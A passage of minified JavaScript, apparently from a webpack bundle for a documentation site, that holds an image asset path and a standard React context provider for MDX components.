n=s.p+"assets/images/image-20240328173425683-47039d427681b21ba1cab069d330befe.png"},11151:(e,i,s)=>{s.d(i,{Z:()=>a,a:()=>d});var n=s(67294);const c={},t=n.createContext(c);function d(e){const i=n.useContext(t);return n.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function a(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:d(e.components),n.createElement(t.Provider,{value:i},e.children)}}}]);